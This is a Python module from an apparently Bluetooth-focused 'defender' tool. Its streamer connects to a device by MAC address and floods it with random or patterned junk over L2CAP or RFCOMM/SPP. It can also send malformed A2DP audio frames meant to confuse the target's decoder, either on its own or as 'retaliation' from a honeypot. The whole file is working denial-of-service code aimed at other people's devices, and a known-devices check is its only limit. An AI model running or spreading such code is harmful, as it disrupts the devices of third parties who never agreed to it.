"""Byte-streaming deterrent — sends garbage data to Bluetooth devices."""

import asyncio
import os
import sys

from bumble.device import Connection, Device
from bumble.host import Host
from rich.console import Console
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn

from defender.utils.bt_helpers import (
    find_usb_transport,
    load_known_devices,
    normalize_mac,
    validate_mac,
)
from defender.utils.logging import get_logger, log_event

console = Console()
logger = get_logger("streamer")

# L2CAP PSMs to try
AVDTP_PSM = 0x0019
SDP_PSM = 0x0001
DEFAULT_PSM = 0x1001  # Dynamic range


def generate_payload(pattern: str, size: int) -> bytes:
    """Generate a payload of the given size based on the pattern type."""
    if pattern == "random":
        return os.urandom(size)
    elif pattern == "zeros":
        return b"\x00" * size
    elif pattern.startswith("0x") or pattern.startswith("0X"):
        # Custom hex pattern, repeated to fill size
        hex_bytes = bytes.fromhex(pattern[2:])
        repeats = (size // len(hex_bytes)) + 1
        return (hex_bytes * repeats)[:size]
    else:
        # Repeating ASCII pattern
        return (pattern.encode() * ((size // len(pattern)) + 1))[:size]


async def stream_l2cap(
    connection: Connection,
    device: Device,
    pattern: str = "random",
    packet_size: int = 672,
    interval: float = 0.01,
    duration: float | None = None,
) -> dict:
    """Send a stream of bytes over an L2CAP channel."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    try:
        # Try to open an L2CAP channel
        channel = await device.l2cap_channel_manager.connect(connection, DEFAULT_PSM)
        console.print(f"[green]L2CAP channel opened (PSM: 0x{DEFAULT_PSM:04X})[/green]")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.fields[bytes_sent]}"),
            console=console,
        ) as progress:
            task = progress.add_task("Streaming...", total=None, bytes_sent="0 bytes")

            while True:
                elapsed = asyncio.get_event_loop().time() - start_time
                if duration and elapsed >= duration:
                    break

                payload = generate_payload(pattern, packet_size)
                try:
                    channel.write(payload)
                    stats["bytes_sent"] += len(payload)
                    stats["packets_sent"] += 1
                    progress.update(
                        task,
                        bytes_sent=f"{stats['bytes_sent']:,} bytes ({stats['packets_sent']} pkts)",
                    )
                except Exception as e:
                    stats["errors"] += 1
                    log_event(
                        logger,
                        "streamer",
                        "write_error",
                        error=str(e),
                        packets_sent=stats["packets_sent"],
                    )
                    break

                await asyncio.sleep(interval)

    except Exception as e:
        console.print(f"[red]L2CAP connection failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "l2cap_error", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


async def stream_spp(
    connection: Connection,
    device: Device,
    pattern: str = "random",
    packet_size: int = 512,
    interval: float = 0.01,
    duration: float | None = None,
) -> dict:
    """Send a stream of bytes over RFCOMM/SPP."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    try:
        from bumble.rfcomm import Client as RfcommClient

        rfcomm_client = RfcommClient(device, connection)
        session = await rfcomm_client.start()
        channel = await session.open_dlc(1)  # RFCOMM channel 1

        console.print("[green]RFCOMM/SPP channel opened[/green]")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.fields[bytes_sent]}"),
            console=console,
        ) as progress:
            task = progress.add_task("Streaming SPP...", total=None, bytes_sent="0 bytes")

            while True:
                elapsed = asyncio.get_event_loop().time() - start_time
                if duration and elapsed >= duration:
                    break

                payload = generate_payload(pattern, packet_size)
                try:
                    channel.write(payload)
                    stats["bytes_sent"] += len(payload)
                    stats["packets_sent"] += 1
                    progress.update(
                        task,
                        bytes_sent=f"{stats['bytes_sent']:,} bytes ({stats['packets_sent']} pkts)",
                    )
                except Exception as e:
                    stats["errors"] += 1
                    log_event(
                        logger,
                        "streamer",
                        "spp_write_error",
                        error=str(e),
                        packets_sent=stats["packets_sent"],
                    )
                    break

                await asyncio.sleep(interval)

    except Exception as e:
        console.print(f"[red]SPP connection failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "spp_error", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


async def stream_a2dp_garbage(
    connection: Connection,
    device: Device,
    pattern: str = "random",
    packet_size: int = 672,
    interval: float = 0.005,
    duration: float | None = None,
) -> dict:
    """Send malformed A2DP/SBC frames over AVDTP. Experimental."""
    stats = {"bytes_sent": 0, "packets_sent": 0, "errors": 0, "duration": 0.0}
    start_time = asyncio.get_event_loop().time()

    try:
        # Open L2CAP on AVDTP PSM
        channel = await device.l2cap_channel_manager.connect(connection, AVDTP_PSM)
        console.print(f"[green]AVDTP L2CAP channel opened (PSM: 0x{AVDTP_PSM:04X})[/green]")

        # Send garbage that looks vaguely like SBC frames
        # SBC frame header: syncword (0x9C) + bitpool/blocks/etc
        SBC_SYNC = b"\x9c"

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.fields[bytes_sent]}"),
            console=console,
        ) as progress:
            task = progress.add_task("Streaming A2DP garbage...", total=None, bytes_sent="0 bytes")

            while True:
                elapsed = asyncio.get_event_loop().time() - start_time
                if duration and elapsed >= duration:
                    break

                # Prepend SBC sync byte to garbage to confuse the decoder
                garbage = SBC_SYNC + generate_payload(pattern, packet_size - 1)
                try:
                    channel.write(garbage)
                    stats["bytes_sent"] += len(garbage)
                    stats["packets_sent"] += 1
                    progress.update(
                        task,
                        bytes_sent=f"{stats['bytes_sent']:,} bytes ({stats['packets_sent']} pkts)",
                    )
                except Exception as e:
                    stats["errors"] += 1
                    log_event(
                        logger,
                        "streamer",
                        "a2dp_write_error",
                        error=str(e),
                        packets_sent=stats["packets_sent"],
                    )
                    break

                await asyncio.sleep(interval)

    except Exception as e:
        console.print(f"[red]A2DP stream failed: {e}[/red]")
        stats["errors"] += 1
        log_event(logger, "streamer", "a2dp_error", error=str(e))

    stats["duration"] = asyncio.get_event_loop().time() - start_time
    return stats


STREAM_MODES = {
    "l2cap": stream_l2cap,
    "spp": stream_spp,
    "a2dp_garbage": stream_a2dp_garbage,
}


async def stream_to_connection(
    connection: Connection,
    device: Device,
    mode: str = "l2cap",
    pattern: str = "random",
    packet_size: int = 672,
    interval: float = 0.01,
    duration: float | None = None,
) -> dict:
    """Stream bytes to an existing connection (called from honeypot --retaliate)."""
    stream_fn = STREAM_MODES.get(mode, stream_l2cap)
    mac = normalize_mac(str(connection.peer_address))

    console.print(f"[bold yellow]Streaming {mode} to {mac}[/bold yellow]")
    log_event(
        logger,
        "streamer",
        "stream_start",
        mac=mac,
        mode=mode,
        pattern=pattern,
        packet_size=packet_size,
    )

    stats = await stream_fn(
        connection,
        device,
        pattern=pattern,
        packet_size=packet_size,
        interval=interval,
        duration=duration,
    )

    log_event(logger, "streamer", "stream_complete", mac=mac, **stats)
    console.print(
        f"[bold]Stream complete:[/bold] {stats['bytes_sent']:,} bytes, "
        f"{stats['packets_sent']} packets, {stats['duration']:.1f}s, "
        f"{stats['errors']} errors"
    )
    return stats


async def run(
    target: str,
    mode: str = "l2cap",
    pattern: str = "random",
    packet_size: int = 672,
    interval: float = 0.01,
    duration: float | None = 10.0,
    known_devices_path: str | None = None,
) -> None:
    """Run the streamer in standalone mode — connect to a target and stream bytes."""
    if not validate_mac(target):
        console.print(f"[red]Invalid MAC address: {target}[/red]")
        sys.exit(1)

    target = normalize_mac(target)

    # Safety check
    if known_devices_path:
        known = load_known_devices(known_devices_path)
        known_macs = {d["mac"] for d in known}
        if target in known_macs:
            console.print(
                f"[bold red]Refusing to target known device {target}. "
                f"Remove it from known devices if you really want to do this.[/bold red]"
            )
            sys.exit(1)

    console.print(f"[bold]Streamer targeting {target}[/bold]")
    console.print(
        f"[dim]Mode: {mode} | Pattern: {pattern} | "
        f"Size: {packet_size}B | Interval: {interval}s | "
        f"Duration: {duration or 'unlimited'}s[/dim]"
    )
    console.print()

    # Open USB transport and connect
    transport = await find_usb_transport()

    host = Host()
    host.hci_source = transport.source
    host.hci_sink = transport.sink

    device = Device(name="BT-Defender", host=host)
    await device.power_on()

    try:
        console.print(f"[blue]Connecting to {target}...[/blue]")
        from bumble.core import BT_BR_EDR_TRANSPORT

        connection = await device.connect(target, transport=BT_BR_EDR_TRANSPORT)
        console.print(f"[green]Connected to {target}[/green]")

        await stream_to_connection(
            connection,
            device,
            mode=mode,
            pattern=pattern,
            packet_size=packet_size,
            interval=interval,
            duration=duration,
        )

    except Exception as e:
        console.print(f"[red]Failed to connect to {target}: {e}[/red]")
        log_event(logger, "streamer", "connect_error", target=target, error=str(e))
    finally:
        await device.power_off()
        transport.close()
